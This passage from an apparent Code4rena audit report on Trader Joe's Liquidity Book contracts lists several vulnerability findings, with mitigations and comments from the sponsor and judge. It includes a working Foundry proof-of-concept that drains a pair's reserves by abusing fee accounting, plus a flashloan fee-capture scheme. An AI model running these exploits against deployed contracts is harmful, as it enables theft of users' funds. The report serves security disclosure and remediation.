841](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L841) which will set the expected `amountOut = amountsIn[i+1] = amountsIn[1] = userDesireAmount`.\n    ```solidity\n    // url = https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L841\n    amountOut = _amountsIn[i + 1];\n    ```\n    So after calling `IJoePair(_pair).swap()`, the user just gets exactly `amountOut` and wastes a lot of tokenIn that (s)he transfers to the pool.\n\n### Proof of concept\n\nHere is our test script to describe the impacts\n\n*   <https://gist.github.com/huuducst/6e34a7bdf37bb29f4b84d2faead94dc4>\n\nYou can place this file into `/test` folder and run it using\n\n```\nforge test --match-test testBugSwapJoeV1PairWithLBRouter --fork-url https://rpc.ankr.com/avalanche --fork-block-number 21437560 -vv\n```\n\nExplanation of test script: (For more detail you can read the comments from test script above)\n\n1. Firstly we get the Joe v1 pair WAVAX/USDC from JoeFactory.\n2. At the forked block, price `WAVAX/USDC` was around 15.57. We try to use LBRouter function `swapTokensForExactTokens` to swap `10$` WAVAX (10e18 wei) to `1$` USDC (1e6 wei). But it reverts with the error `LBRouter__MaxAmountInExceeded`. But when we swap directly to JoePair, it swap successfully `10$` AVAX (10e18 wei) to `155$` USDC (155e6 wei).\n3. We use LBRouter function `swapTokensForExactTokens` again with very large `amountInMax` to swap `1$` USDC (1e6 wei). It swaps successfully but needs to pay a very large amount WAVAX (much more than price).\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nModify function `LBRouter._getAmountsIn` as follow\n\n```solidity\n// url = https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L717-L728\nif (_binStep == 0) {\n    (uint256 _reserveIn, uint256 _reserveOut, ) = IJoePair(_pair).getReserves();\n    if (_token > _tokenPath[i]) {\n        (_reserveIn, _reserveOut) = (_reserveOut, _reserveIn);\n    }\n\n\n    uint256 amountOut_ = amountsIn[i];\n    // Legacy uniswap way of rounding\n    // Fix here \n    amountsIn[i - 1] = (_reserveIn * amountOut_ * 1_000) / ((_reserveOut - amountOut_) * 997) + 1;\n} else {\n    (amountsIn[i - 1], ) = getSwapIn(ILBPair(_pair), amountsIn[i], ILBPair(_pair).tokenX() == _token);\n}\n```\n\n**[0x0Louis (Trader Joe) confirmed](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/400)**\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/400#issuecomment-1309002772):**\n > The warden has shown how, due to an incorrect order of operation, the math for the router will be incorrect.\n> \n> While the error could be considered a typo, the router is the designated proper way of performing a swap, and due to this finding, the math will be off.\n> \n> Because the impact shows an incorrect logic, and a broken invariant (the router uses incorrect amounts, sometimes reverting, sometimes costing the end user more tokens than necessary), I believe High Severity to be appropriate.\n> \n> Mitigation will require refactoring and may be aided by the test case offered in this report.\n\n\n\n***\n\n## [[H-05] Attacker can steal entire reserves by abusing fee calculation](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/423)\n*Submitted by [Trust](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/423), also found by [zzykxx](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/320)*\n\n<https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L819-L829><br>\n<https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L202><br>\n\nSimilar to other LP pools, In Trader Joe users can call `mint()` to provide liquidity and receive LP tokens, and `burn()` to return their LP tokens in exchange for underlying assets. Users collect fees using `collectFess(account,binID)`. Fees are implemented using debt model. The fundamental fee calculation is:\n\n        function _getPendingFees(\n            Bin memory _bin,\n            address _account,\n            uint256 _id,\n            uint256 _balance\n        ) private view returns (uint256 amountX, uint256 amountY) {\n            Debts memory _debts = _accruedDebts[_account][_id];\n\n            amountX = _bin.accTokenXPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET) - _debts.debtX;\n            amountY = _bin.accTokenYPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET) - _debts.debtY;\n        }\n\naccTokenXPerShare / accTokenYPerShare is an ever increasing amount that is updated when swap fees are paid to the current active bin.\n\nWhen liquidity is first minted to user, the \\_accruedDebts is updated to match current \\_balance &ast; accToken&ast;PerShare. Without this step, user could collect fees for the entire growth of accToken&ast;PerShare from zero to current value. This is done in \\_updateUserDebts, called by \\_cacheFees() which is called by \\_beforeTokenTransfer(), the token transfer hook triggered on mint/burn/transfer.\n\n        function _updateUserDebts(\n            Bin memory _bin,\n            address _account,\n            uint256 _id,\n            uint256 _balance\n        ) private {\n            uint256 _debtX = _bin.accTokenXPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET);\n            uint256 _debtY = _bin.accTokenYPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET);\n\n            _accruedDebts[_account][_id].debtX = _debtX;\n            _accruedDebts[_account][_id].debtY = _debtY;\n        }\n\nThe critical problem lies in \\_beforeTokenTransfer:\n\n    if (_from != _to) {\n        if (_from != address(0) && _from != address(this)) {\n            uint256 _balanceFrom = balanceOf(_from, _id);\n            _cacheFees(_bin, _from, _id, _balanceFrom, _balanceFrom - _amount);\n        }\n        if (_to != address(0) && _to != address(this)) {\n            uint256 _balanceTo = balanceOf(_to, _id);\n            _cacheFees(_bin, _to, _id, _balanceTo, _balanceTo + _amount);\n        }\n    }\n\nNote that if \\_from or \\_to is the LBPair contract itself, \\_cacheFees won't be called on \\_from or \\_to respectively. This was presumably done because it is not expected that the LBToken address will receive any fees. It is expected that the LBToken will only hold tokens when user sends LP tokens to burn.\n\nThis is where the bug manifests - the LBToken address (and 0 address), will collect freshly minted LP token's fees from 0 to current accToken&ast;PerShare value.\n\nWe can exploit this bug to collect the entire reserve assets. The attack flow is:\n\n*   Transfer amount X to pair\n*   Call `pair.mint()`, with the to address = pair address\n*   call `collectFees()` with pair address as account -> pair will send to itself the fees! It is interesting that both OZ ERC20 implementation and LBToken implementation allow this, otherwise this exploit chain would not work\n*   Pair will now think user sent in money, because the bookkeeping is wrong. \\_pairInformation.feesX.total is decremented in `collectFees()`, but the balance did not change. Therefore, this calculation will credit attacker with the fees collected into the pool:\n\n<!---->\n\n    uint256 _amountIn = _swapForY\n        ? tokenX.received(_pair.reserveX, _pair.feesX.total)\n        : tokenY.received(_pair.reserveY, _pair.feesY.total);\n\n*   Attacker calls `swap()` and receives reserve assets using the fees collected.\n*   Attacker calls `burn()`, passing their own address in \\_to parameter. This will successfully burn the minted tokens from step 1 and give Attacker their deposited assets.\n\nNote that if the contract did not have the entire collectFees code in an unchecked block, the loss would be limited to the total fees accrued:\n\n    if (amountX != 0) {\n        _pairInformation.feesX.total -= uint128(amountX);\n    }\n    if (amountY != 0) {\n        _pairInformation.feesY.total -= uint128(amountY);\n    }\n\nIf attacker would try to overflow the feesX/feesY totals, the call would revert. Unfortunately, because of the unchecked block feesX/feesY would overflow and therefore there would be no problem for attacker to take the entire reserves.\n\n### Impact\n\nAttacker can steal the entire reserves of the LBPair.\n\n### Proof of Concept\n\nPaste this test in LBPair.Fees.t.sol:\n\n        function testAttackerStealsReserve() public {\n            uint256 amountY=  53333333333333331968;\n            uint256 amountX = 100000;\n\n            uint256 amountYInLiquidity = 100e18;\n            uint256 totalFeesFromGetSwapX;\n            uint256 totalFeesFromGetSwapY;\n\n            addLiquidity(amountYInLiquidity, ID_ONE, 5, 0);\n            uint256 id;\n            (,,id ) = pair.getReservesAndId();\n            console.log(\"id before\" , id);\n\n            //swap X -> Y and accrue X fees\n            (uint256 amountXInForSwap, uint256 feesXFromGetSwap) = router.getSwapIn(pair, amountY, true);\n            totalFeesFromGetSwapX += feesXFromGetSwap;\n\n            token6D.mint(address(pair), amountXInForSwap);\n            vm.prank(ALICE);\n            pair.swap(true, DEV);\n            (uint256 feesXTotal, , uint256 feesXProtocol, ) = pair.getGlobalFees();\n\n            (,,id ) = pair.getReservesAndId();\n            console.log(\"id after\" , id);\n\n\n            console.log(\"Bob balance:\");\n            console.log(token6D.balanceOf(BOB));\n            console.log(token18D.balanceOf(BOB));\n            console.log(\"-------------\");\n\n            uint256 amount0In = 100e18;\n\n            uint256[] memory _ids = new uint256[](1); _ids[0] = uint256(ID_ONE);\n            uint256[] memory _distributionX = new uint256[](1); _distributionX[0] = uint256(Constants.PRECISION);\n            uint256[] memory _distributionY = new uint256[](1); _distributionY[0] = uint256(0);\n\n            console.log(\"Minting for BOB:\");\n            console.log(amount0In);\n            console.log(\"-------------\");\n\n            token6D.mint(address(pair), amount0In);\n            //token18D.mint(address(pair), amount1In);\n            pair.mint(_ids, _distributionX, _distributionY, address(pair));\n            uint256[] memory amounts = new uint256[](1);\n            console.log(\"***\");\n            for (uint256 i; i < 1; i++) {\n                amounts[i] = pair.balanceOf(address(pair), _ids[i]);\n                console.log(amounts[i]);\n            }\n            uint256[] memory profit_ids = new uint256[](1); profit_ids[0] = 8388608;\n            (uint256 profit_X, uint256 profit_Y) = pair.pendingFees(address(pair), profit_ids);\n            console.log(\"profit x\", profit_X);\n            console.log(\"profit y\", profit_Y);\n            pair.collectFees(address(pair), profit_ids);\n            (uint256 swap_x, uint256 swap_y) = pair.swap(true,BOB);\n\n            console.log(\"swap x\", swap_x);\n            console.log(\"swap y\", swap_y);\n\n            console.log(\"Bob balance after swap:\");\n            console.log(token6D.balanceOf(BOB));\n            console.log(token18D.balanceOf(BOB));\n            console.log(\"-------------\");\n\n            console.log(\"*****\");\n            pair.burn(_ids, amounts, BOB);\n\n\n            console.log(\"Bob balance after burn:\");\n            console.log(token6D.balanceOf(BOB));\n            console.log(token18D.balanceOf(BOB));\n            console.log(\"-------------\");\n\n        }\n\n### Tools Used\n\nManual audit, foundry\n\n### Recommended Mitigation Steps\n\nCode should not exempt any address from \\_cacheFees(). Even `address(0)` is important, because attacker can collectFees for the 0 address to overflow the FeesX/FeesY variables, even though the fees are not retrievable for them.\n\n**[0x0Louis (Trader Joe) confirmed](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/423)**\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/423#issuecomment-1312203078):**\n > The Warden has shown how to exploit logic paths that would skip fee accrual, to be able to gather more fees than expected.\n> \n> While the finding pertains to a loss of fees, the repeated attack will allow stealing reserves as well, for this reason I agree with High Severity.\n\n\n\n***\n\n# Medium Risk Findings (7)\n## [[M-01] `LBRouter.removeLiquidity` returning wrong values](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/105)\n*Submitted by [Lambda](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/105)*\n\n[LBRouter.sol#L291](https://github.com/code-423n4/2022-10-traderjoe/blob/e81b78ddb7cc17f0ece921fbaef2c2521727094b/src/LBRouter.sol#L291)<br>\n\n`LBRouter.removeLiquidity` reorders tokens when the user did not pass them in the pair order (ascending order):\n\n```solidity\nif (_tokenX != _LBPair.tokenX()) {\n            (_tokenX, _tokenY) = (_tokenY, _tokenX);\n            (_amountXMin, _amountYMin) = (_amountYMin, _amountXMin);\n}\n```\n\nHowever, when returning `amountX` and `amountY`, it is ignored if the order was changed:\n\n```solidity\n(amountX, amountY) = _removeLiquidity(_LBPair, _amountXMin, _amountYMin, _ids, _amounts, _to);\n```\n\nTherefore, when the order of the tokens is swapped by the function, the return value `amountX` (\"Amount of token X returned\") in reality is the amount of the user-provided token Y that is returned and vice versa.\n\nBecause this is an exposed function that third-party protocols / contracts will use, this can cause them to malfunction. For instance, when integrating with Trader Joe, something natural to do is:\n\n    (uint256 amountAReceived, uint256 amountBReceived) = LBRouter.removeLiquidity(address(tokenA), address(tokenB), ...);\n    contractBalanceA += amountAReceived;\n    contractBalanceB += amountBReceived;\n\nThis snippet will only be correct when the token addresses are passed in the right order, which should not be the case. When they are not passed in the right order, the accounting of third-party contracts will be messed up, leading to vulnerabilities / lost funds there.\n\n### Proof Of Concept\n\nFirst consider the following diff, which shows a scenario when `LBRouter` does not switch `tokenX` and `tokenY`, resulting in correct return values:\n\n```diff\n--- a/test/LBRouter.Liquidity.t.sol\n+++ b/test/LBRouter.Liquidity.t.sol\n@@ -57,7 +57,9 @@ contract LiquidityBinRouterTest is TestHelper {\n \n         pair.setApprovalForAll(address(router), true);\n \n-        router.removeLiquidity(\n+        uint256 token6BalBef = token6D.balanceOf(DEV);\n+        uint256 token18BalBef = token18D.balanceOf(DEV);\n+        (uint256 amountFirstRet, uint256 amountSecondRet) = router.removeLiquidity(\n             token6D,\n             token18D,\n             DEFAULT_BIN_STEP,\n@@ -70,7 +72,9 @@ contract LiquidityBinRouterTest is TestHelper {\n         );\n \n         assertEq(token6D.balanceOf(DEV), amountXIn);\n+        assertEq(amountXIn, token6BalBef + amountFirstRet);\n         assertEq(token18D.balanceOf(DEV), _amountYIn);\n+        assertEq(_amountYIn, token18BalBef + amountSecondRet);\n     }\n \n     function testRemoveLiquidityReverseOrder() public {\n```\n\nThis test passes (as it should). Now, consider the following diff, where `LBRouter` switches `tokenX` and `tokenY`:\n\n```diff\n--- a/test/LBRouter.Liquidity.t.sol\n+++ b/test/LBRouter.Liquidity.t.sol\n@@ -57,12 +57,14 @@ contract LiquidityBinRouterTest is TestHelper {\n \n         pair.setApprovalForAll(address(router), true);\n \n-        router.removeLiquidity(\n-            token6D,\n+        uint256 token6BalBef = token6D.balanceOf(DEV);\n+        uint256 token18BalBef = token18D.balanceOf(DEV);\n+        (uint256 amountFirstRet, uint256 amountSecondRet) = router.removeLiquidity(\n             token18D,\n+            token6D,\n             DEFAULT_BIN_STEP,\n-            totalXbalance,\n             totalYBalance,\n+            totalXbalance,\n             ids,\n             amounts,\n             DEV,\n@@ -70,7 +72,9 @@ contract LiquidityBinRouterTest is TestHelper {\n         );\n \n         assertEq(token6D.balanceOf(DEV), amountXIn);\n+        assertEq(amountXIn, token6BalBef + amountSecondRet);\n         assertEq(token18D.balanceOf(DEV), _amountYIn);\n+        assertEq(_amountYIn, token18BalBef + amountFirstRet);\n     }\n \n     function testRemoveLiquidityReverseOrder() public {\n```\n\nThis test should also pass (the order of the tokens was only switched), but it does not because the return values are mixed up.\n\n### Recommended Mitigation Steps\n\nAdd the following statement in the end:\n\n```solidity\nif (_tokenX != _LBPair.tokenX()) {\n\treturn (amountY, amountX);\n}\n```\n\n**[0x0Louis (Trader Joe) confirmed](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/105)**\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/105#issuecomment-1313783137):**\n > The Warden has shown how, due to an inconsistent re-ordering, the removeLiqudity function can return incorrect (swapped) amounts.\n> \n> While invariants are not broken, this is an example of an incorrect function behaviour.\n> \n> For this reason, despite no loss of value, I believe Medium Severity to be appropriate as the potential impact warrants an increased severity.\n\n\n\n***\n\n## [[M-02] `beforeTokenTransfer` called with wrong parameters in `LBToken._burn`](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/108)\n*Submitted by [Lambda](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/108), also found by [imare](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/514), [indijanc](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/513), [MiloTruck](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/509), [zzzitron](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/504), [chaduke](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/503), [bctester](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/502), [Aymen0909](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/500), [The\\_GUILD](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/499), [RustyRabbit](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/498), [phaze](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/497), [0x52](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/179), [ladboy233](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/125), and [KingNFT](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/19)*\n\n[LBToken.sol#L237](https://github.com/code-423n4/2022-10-traderjoe/blob/37258d595d596c195507234f795fa34e319b0a68/src/LBToken.sol#L237)<br>\n\nIn `LBToken._burn`, the `_beforeTokenTransfer` hook is called with `from = address(0)` and `to = _account`:\n\n```solidity\n_beforeTokenTransfer(address(0), _account, _id, _amount);\n```\n\nThrough a lucky coincidence, it turns out that this in the current setup does not cause a high severity issue. `_burn` is always called with `_account = address(this)`, which means that `LBPair._beforeTokenTransfer` is a NOP. However, this wrong call is very dangerous for future extensions or protocol that built on top of the protocol / fork it.\n\n### Proof Of Concept\n\nLet's say the protocol is extended with some logic that needs to track mints / burns. The canonical way to do this would be:\n\n```solidity\nfunction _beforeTokenTransfer(\n        address _from,\n        address _to,\n        uint256 _id,\n        uint256 _amount\n    ) internal override(LBToken) {\n\tif (_from == address(0)) {\n\t\t// Mint Logic\n\t} else if (_to == address(0)) {\n\t\t// Burn Logic\n\t}\n}\n```\n\nSuch an extension would break, which could lead to loss of funds or a bricked system.\n\n### Recommended Mitigation Steps\n\nCall the hook correctly:\n\n```solidity\n_beforeTokenTransfer(_account, address(0), _id, _amount);\n```\n\n**[0x0Louis (Trader Joe) confirmed](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/108)**\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/108#issuecomment-1312200836):**\n > The warden has shown how, due to a typo / programming mistake, the hook for burning tokens is called with incorrect parameters.\n> \n> Because of the caller being the pair, this ends up having reduced impact.\n\n\n\n***\n\n## [[M-03] Flashloan fee collection mechanism can be easily manipulated](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/136)\n*Submitted by [shung](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/136), also found by [philogy](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/489), [Trust](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/419), [parashar](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/302), [0x52](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/173), [rvierdiiev](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/126), and [KingNFT](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/82)*\n\n[`LBPair.flashLoan()`](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L415-L456) utilizes an “unfair” fee mechanism in which the whole pair liquidity can be loaned but only the liquidity providers of the active bin receive the fees. Although one can argue that this unfair structure is to incentivize greater liquidity around the active price range, it nonetheless opens up a way to easily manipulate fees. The current structure allows a user to provide liquidity to an active bin right before a flashloan to receive most of the fees. This trick can be used both by the borrower themselves, or by a third party miner or a node operator frontrunning the flashloan transactions. In either case, this is in detriment to the liquidity providers, who would be providing the bulk of the flashloan, but receiving a much less fraction of the fees.\n\n### Proof of Concept\n\n`LBPair.flashLoan()` function [enables borrowing the entire balance of a pair](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L435-L436).\n\n```solidity\n        tokenX.safeTransfer(_to, _amountXOut);\n        tokenY.safeTransfer(_to, _amountYOut);\n```\n\nThis means that a liquidity provider’s tokens can be used regardless of which bin their liquidity is in. However, the loan fee [is only paid to the active bin’s liquidity providers](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L452-L453).\n\n```solidity\n        _bins[_id].accTokenXPerShare += _feesX.getTokenPerShare(_totalSupply);\n        _bins[_id].accTokenYPerShare += _feesY.getTokenPerShare(_totalSupply);\n```\n\nBased on this, someone can frontrun a flashloan by adding liquidity to the active bin to receive the most of the flashloan fees, even if the active bin constitutes a small percentage of the loaned amount. Alternatively, a borrower can also atomically add and remove liquidity to the active bin before and after the flashloan, respectively. This way the borrower essentially would be using flashloans with fraction of the intended fee.\n\n#### Example Scenario\n\nImagine a highly volatile market, in which the liquidity providers lag behind the price action, resulting in active bin to constitute a very small percent of the liquidity.  The following snippet shows the liquidity in each bin of the eleven bins of this imaginary market. The active bin, marked with an in-line comment, has 1 token X and 1 token Y in its reserves. You can appreciate that such a liquidity composition is highly probable when the price of the asset increases rapidly, leaving the concentrated liquidity behind. Even when this type of a distribution is not readily available, the price can be manipulated to create a similar distribution allowing the profitable execution of the described trick to steal flashloan fees.\n\n```js\n[\n\t[ 0, 10 ],\n\t[ 0, 30 ],\n\t[ 0, 40 ],\n\t[ 0, 90 ],\n\t[ 0, 80 ],\n\t[ 0, 50 ],\n\t[ 0, 30 ],\n\t[ 0, 10 ],\n\t[ 0,  9 ],\n\t[ 1,  1 ], // Active bin\n\t[ 1,  0 ]\n]\n```\n\nHere, a flashloan user can do the following transactions atomically (note: function arguments are simplified to portray the idea):\n\n```solidity\n    LBRouter.addLiquidity({\n        binId: ACTIVE_BIN,\n        tokenXAmount: 9,\n        tokenYAmount: 9\n    }); \n    LBPair.flashLoan({\n        tokenXAmount: 359,\n        tokenYAmount: 0\n    });\n    LBRouter.removeLiquidity({\n        binId: ACTIVE_BIN,\n        tokenXAmount: 9,\n        tokenYAmount: 9\n    }); \n```\n\nWith this method, the borrower will receive 90% of the liquidity provider fees of the flashloan, even though they only had 2.5% of the token X liquidity. This method is very likely to cause majority of the flashloan fees leaking out of the protocol, denying liquidity providers their revenue. Even if the average flashloan borrower does not utilize this strategy to reduce the effective fee they pay, the trick would surely be used by MEV users sandwiching the flashloan transactions to receive the majority of the fees.\n\n### Recommended Mitigation Steps\n\nThe ideal remediation would be to have a separate global fee structure for a given pair, and record token X and token Y fees per share separately. So if user A has only token X, they should only receive fee when token X is loaned, and not when token Y is loaned. But user A should receive their fee regardless of which bin their liquidity is in. However, given that users’ token reserves change dynamically, there appears to be no simple way of achieving this.\n\nIf the ideal remediation cannot be achieved, a compromise would be to distribute the flashloan fees from the -nth populated bin to the +nth populated bin, where `n` is respective to the active bin. `n` could be an adjustable market parameter. A higher value of `n` would make the flashloan gas cost higher, but it would reduce the feasibility of the issues described in this finding. Admittedly, this is not a perfect solution: As long as an incomplete subset of liquidity providers or bins receive the flashloan fees, there will be bias hence a risk of inequitable or exploitable fee distribution.\n\nIf the compromise is not deemed sufficient, the alternative would be to remove the flashloan feature from the protocol altogether. If the liquidity providers cannot equitably receive their flashloan fees, it might not worth to expose them to the risks of flashloans.\n\n**[0x0Louis (Trader Joe) acknowledged and commented](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/136#issuecomment-1297273480):**\n > We acknowledge this issue as we want to keep the flash loan, but giving fees to the nth bins would make the function too expensive to use. As our goal is to concentrate the liquidity in the active bin, this behavior is fine for us.\n\n**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/136#issuecomment-1312780046):**\n > Per the discussion above, the Warden has shown how, LPs that are not in active positions will not receive fees for the liquidity they supplied.\n> \n> The sponsor acknowledges.\n> \n> Because the finding demonstrates loss of yield for LPs (inactive liquidity can be used, but will receive no fees), I believe Medium Severity to be appropriate.\n> \n> The other side of the coin for this feature is that it does incentivize keeping liquidity in an active bin, which does help with capital efficiency, however, at this time, we cannot speculate about the usage of the protocol and per the above some LP risk not receiving fees.\n\n\n\n***\n\n## [[M-04] Very critical `Owner` privileges can cause complete destruction of the project in a possible privateKey exploit](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/139)\n*Submitted by [0xSmartContract](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/139), also found by [csanuragjain](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/517), [djxploit](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/516), [hansfriese](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/515), [Josiah](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/512), [leosathya](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/511), [M4TZ1P](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/510), [sorrynotsorry](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/507), [wagmi](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/506), [zzykxx](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/505), [Aymen0909](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/501), [chaduke](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/435), [SooYa](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/399), [Mukund](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/377), [pashov](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/344), [Dravee](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/338), [catchup](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/149), [rvierdiiev](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/119), [Nyx](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/91), [vv7](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/78), [cccz](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/56), [ladboy233](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/25), and [supernova](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/3)*\n\n[PendingOwnable.sol#L42](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/libraries/PendingOwnable.sol#L42)<br>\n\nTypically, the contract’s owner is the account that deploys the contract. As a result, the owner is able to perform certain privileged activities.\n\nHowever, Owner privileges are numerous and there is no timelock structure in the process of using these privileges.\nThe Owner is assumed to be an EOA, since the documents do not provide information on whether the Owner will be a multisign structure.\n\nIn parallel with the private key thefts of the project owners, which have increased recently, this vulnerability has been stated as medium.\n\nSimilar vulnerability;<br>\nPrivate keys stolen:\n\nHackers have stolen cryptocurrency worth around `€552` million from a blockchain project linked to the popular online game Axie Infinity, in one of the largest cryptocurrency heists on record. Security issue : PrivateKey of the project officer was stolen:\n<https://www.euronews.com/next/2022/03/30/blockchain-network-ronin-hit-by-552-million-crypto-heist>\n\n### Proof of Concept\n\n`onlyOwner` powers;\n\n```js\n14 results - 2 files\n\nsrc/LBFactory.sol:\n  220:     function setLBPairImplementation(address _LBPairImplementation) external override onlyOwner {\n  322:     function setLBPairIgnored() external override onlyOwner {\n  355:     function setPreset() external override onlyOwner {\n  401:     function removePreset(uint16 _binStep) external override onlyOwner {\n  439:     function setFeesParametersOnPair) external override onlyOwner {\n  473:     function setFeeRecipient(address _feeRecipient) external override onlyOwner {\n  479:     function setFlashLoanFee(uint256 _flashLoanFee) external override onlyOwner {\n  490:     function setFactoryLockedState(bool _locked) external override onlyOwner {\n  498:     function addQuoteAsset(IERC20 _quoteAsset) external override onlyOwner {\n  507:     function removeQuoteAsset(IERC20 _quoteAsset) external override onlyOwner {\n  525:     function forceDecay(ILBPair _LBPair) external override onlyOwner {\n\nsrc/libraries/PendingOwnable.sol:\n  59:     function setPendingOwner(address pendingOwner_) public override onlyOwner {\n  68:     function revokePendingOwner() public override onlyOwner {\n  84:     function renounceOwnership() public override onlyOwner {\n\n```\n\n### Recommended Mitigation Steps\n\n1- A timelock contract should be added to use `onlyOwner` privileges. In this way, users can be warned in case of a possible security weakness.\n2- `onlyOwner` can be a Multisign wallet and this part is specified in the documentation.\n\n**[0x0Louis (Trader Joe) acknowledged and commented](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/139#issuecomment-1295745672):**\n > The owner will be our multisig.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/139#issuecomment-1312832670):**\n > Per the [rulebook](https://github.com/code-423n4/org/issues/8) will bulk all Admin Privilege findings under this one.\n> \n> Most notably the main issue was the lack of validation on the flashloan fee, which this issue acts as an umbrella for.\n\n\n\n***\n\n## [[M-05] Attacker can keep fees max at no cost](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/430)\n*Submitted by [Trust](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/430), also found by [shung](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/508) and [immeas](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/436)*\n\n[FeeHelper.sol#L58-L72](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/FeeHelper.sol#L58-L72)<br>\n\nThe volatile fee component in TJ is calculated using several variables, as described [here](https://docs.traderjoexyz.com/concepts/fees). Importantly, Va (volatility accumulator) = Vr (volatility reference) + binDelta:\n\n$v_a(k) = v_r + |i_r - (activeId + k)|$\n\nVr is calculated depending on time passed since last swap:\n```\nv_r = \\left{\\begin{matrix}\nv_r, & t\\<t_f  \\\\\nR \\cdot  v_a & t_f <= t < t_d \\\\\n0, & t_d <= t\n\\end{matrix}\\right.\n```\n\nBelow is the implementation:\n\n    function updateVariableFeeParameters(FeeParameters memory _fp, uint256 _activeId) internal view {\n            uint256 _deltaT = block.timestamp - _fp.time;\n\n            if (_deltaT >= _fp.filterPeriod || _fp.time == 0) {\n                _fp.indexRef = uint24(_activeId);\n                if (_deltaT < _fp.decayPeriod) {\n                    unchecked {\n                        // This can't overflow as `reductionFactor <= BASIS_POINT_MAX`\n                        _fp.volatilityReference = uint24(\n                            (uint256(_fp.reductionFactor) * _fp.volatilityAccumulated) / Constants.BASIS_POINT_MAX\n                        );\n                    }\n                } else {\n                    _fp.volatilityReference = 0;\n                }\n            }\n\n            _fp.time = 